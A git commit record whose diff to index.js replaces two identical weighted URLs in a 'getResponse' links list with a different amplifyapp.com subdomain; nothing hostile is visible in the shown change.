208ab99460acfdc7e7066f759ba03c04eb6df64c
animalinside <akshay.anand12@yahoo.com>
2026-05-16 14:24:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://main.d3v01ekycpbfbc.amplifyapp.com/", weight: 0.5 },
-        { url: "https://main.d3v01ekycpbfbc.amplifyapp.com/", weight: 0.5 }
+        { url: "https://main.dmno27t08b5ro.amplifyapp.com/", weight: 0.5 },
+        { url: "https://main.dmno27t08b5ro.amplifyapp.com/", weight: 0.5 }
       
     ];
 
